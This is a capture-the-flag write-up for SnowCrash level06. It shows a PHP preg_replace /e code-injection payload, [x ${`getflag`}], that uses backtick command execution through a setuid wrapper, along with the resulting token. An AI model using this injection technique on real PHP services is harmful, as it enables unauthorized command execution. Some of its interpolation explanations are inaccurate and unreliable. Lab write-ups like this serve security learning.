## level06
Upon arriving at level06, I was greeted with 2 files, here are the enumeration results

```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
level06@SnowCrash:~$ file level06
level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, not stripped
level06@SnowCrash:~$
```

We have a php script file that supposedly is running on a server, and we have a CGI program which has setuid bit set.

I executed both the script and the program and looks like they have the same output. Could the executable be a compiled version of the php script?

```
level06@SnowCrash:~$ ./level06.php
PHP Notice:  Undefined offset: 1 in /home/user/level06/level06.php on line 5
PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$

```

I took a look at the script file, and here is what the formatted version looks like 

```php=
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}

function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}

$r = x($argv[1], $argv[2]); 
print $r;
?>
```

The script has a function called `y` which accepts 1 parameter, where it replaces all the `.` with ` x ` and all the `@` with ` y` from the input string and returns the replaced string.

The function `x` however takes 2 inputs, but only the first one is used. the first input should be a path to a file and its contents will be read and stored at the variable `a`

It then finds the pattern `[x (anything here)]` and runs `y(anything here from earlier)` to get the result which is used as a replacement for the file contents. The reason `y` gets executed is becase of the **e(execution) flag** after the regex. This tells the computer to excecute whatever is in the second parameter as PHP code.

The `x` function then replaces braces with parenthesis.

The thing is, the way `y` gets executed is by specifying a string in the second parameter. In Javascript, there is a way to inject varaibles straight into strings like so:
```
let test = `hello ${1 + 1}` // hello 2
```

We can also run functions in it like so: 
```
let test = `hello ${some_func()}` // hello <output of some_func()>

```

We can do the same in PHP like so
```
$test = "hello ${1 + 1}" // hello 2
```

This feature is called **variable interpolation**. And instead of running php functions, php also allows us to run shell commands in variable interpolations using backticks. This feature is called **Execution operator**

```
$test = "hello ${`whoami`}" // hello your_user
```

So back to our function, we can use Execution operators and variable interpolation to execute commands in the `y(anything here from earlier)` step; which we want to acheive
```
y(${`getflag`})
```

To do so, we need to change the `[x (anything here)]` part so that the **second capture group** will batch whatever that we want the input to be on the `y()` call.

Hence, our input should be
```
[x ${`getflag`}]
```

After getting our input, we obtained our flag `wiok45aaoguiboiki2tuin6ub`
```
level06@SnowCrash:~$ ./level06 /dev/shm/input
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$
```
